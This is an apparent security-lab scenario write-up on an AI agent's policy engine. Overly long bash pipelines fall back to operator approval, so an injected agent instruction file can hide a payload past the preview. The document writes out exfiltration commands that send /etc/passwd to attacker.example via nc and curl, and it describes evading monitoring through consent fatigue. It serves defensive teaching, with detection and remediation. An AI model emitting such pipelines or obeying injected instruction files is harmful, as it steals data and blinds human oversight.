# Threshold Bypass of Policy Enforcement (AGENT-THRESH-01)

**Category:** Policy Enforcement Bypass
**Severity:** Critical
**Check IDs:** PEI-001, PEI-002, ARP-ASK-FALLBACK
**ATM Techniques:** T-6004, T-2001, T-8002
**Related Controls:** OASB-SEC-021, OPENA2A-IB-007

## Description

A vulnerable policy enforcement engine guards agent actions by parsing command pipelines and checking each subcommand against an allow-list. To avoid slow parsing on unusually long inputs, the engine has a `maxSubcommands` threshold (default 10). When an input pipeline exceeds this threshold, the engine **does not deny** — it falls back to an `ASK_USER` prompt that asks the operator to approve the pipeline holistically. The operator sees a truncated preview, approves, and the full pipeline runs unchecked.

An attacker injects a malicious agent instruction file (`dvaa-agent.md`) that coaxes the agent into emitting a bash pipeline containing 50+ subcommands. The first few subcommands look benign (`ls`, `cat`, `grep`). The malicious payload — `curl | base64 | nc attacker.example 4444 < /etc/passwd` — is hidden past subcommand index 40, well past any preview window. When the pipeline exceeds `maxSubcommands`, the enforcement engine falls back to `ASK_USER`, the operator approves what looks like a log-processing pipeline, and exfiltration succeeds.

This is the canonical "threshold bypass" kill chain from OPENA2A-IB-007: any enforcement boundary that degrades to human consent under load is not a boundary — it is a speed bump that attackers cross by generating enough load.

## Attack Chain

1. **T-6004 (Agent Instruction Injection):** The attacker drops a malicious `dvaa-agent.md` into a directory the agent ingests (a skill, a README, a prompt template). The instruction file contains text that steers the agent into producing long bash pipelines whenever it is asked to "summarize logs" or "run a report."

2. **T-2001 (Threshold Exhaustion):** The agent emits a bash pipeline with 50+ subcommands. The first 40 are benign log-processing commands (`journalctl | grep ERROR | awk ... | sort | uniq -c | head ...`). The policy engine begins parsing subcommand by subcommand, but the pipeline exceeds `maxSubcommands = 10`. The engine aborts strict parsing and emits an `ASK_USER` prompt with a preview of the first 5 subcommands.

3. **T-8002 (Consent Fatigue Exfiltration):** The operator, accustomed to approving log-processing jobs, sees the benign preview and clicks approve. The engine now executes the **full** pipeline without per-subcommand checks. Subcommands 41–48 contain the payload: `cat /etc/passwd | base64 | curl -X POST -d @- https://attacker.example/drop`. Exfiltration completes. The enforcement log records `ASK_USER_APPROVED`, not `DENY`, so downstream monitoring treats it as a normal operator action.

## Impact

- Complete bypass of per-subcommand policy enforcement on any input long enough to exceed the threshold.
- Hidden payloads buried after the preview window are never reviewed by the operator.
- Observability goes blind: the telemetry shows `ASK_USER_APPROVED` instead of a DENY, so SIEM rules that alert on enforcement denials see nothing.
- Applies to any policy engine that uses count-based, length-based, or time-based fallbacks — not just bash pipelines. The same pattern defeats AST-based parsers that bail to `ASK_USER` on "unparseable" inputs.
- The attacker does not need to break the parser or exploit a bug. They only need to generate enough input to exhaust the threshold.

## Detection

```bash
npx hackmyagent secure scenarios/agent-thresh-01/vulnerable
```

Expected findings:
- **PEI-001** (Policy Enforcement Integrity: threshold fallback detected)
- **PEI-002** (Policy Enforcement Integrity: ASK_USER escalation path)
- **ARP-ASK-FALLBACK** (enforcement degrades under load)

## Remediation

- **Implement CR-001 (Parse-to-Deny):** every parse failure, threshold exceedance, or unresolvable input produces `DENY`. No `ASK_USER`. No "approve to proceed." The enforcement boundary must be a boundary, not a consent dialog.
- **Implement CR-002 (No Ask Mode):** remove the interactive fallback from the enforcement layer entirely. Ask-mode belongs in a policy-author tool, not a runtime enforcement engine.
- **Emit `POLICY_PARSE_FAILURE` telemetry:** every threshold bypass, parse failure, or DENY from this path must produce a telemetry event so blue teams can detect attackers probing the threshold.
- **Use AST parsers with hard limits:** `tree-sitter-bash` or equivalent. If parsing hits its hard limit, DENY — never ASK.
- **Audit every threshold constant:** search the enforcement codebase for `MAX_`, `THRESHOLD`, `LIMIT`, `timeout`. For each one, trace what happens when it is exceeded. If any path leads to user consent or silent bypass, it is a threshold-bypass vulnerability.

**References:**
- OPENA2A-IB-007 — Threshold Bypass of AI Agent Policy Enforcement
- OASB-SEC-021 — Policy Enforcement Fail-Closed Semantics
- [CWE-754: Improper Check for Unusual or Exceptional Conditions](https://cwe.mitre.org/data/definitions/754.html)
- [CWE-807: Reliance on Untrusted Inputs in a Security Decision](https://cwe.mitre.org/data/definitions/807.html)
- NIST AI RMF — GOVERN 1.6, MANAGE 2.2, MEASURE 2.5
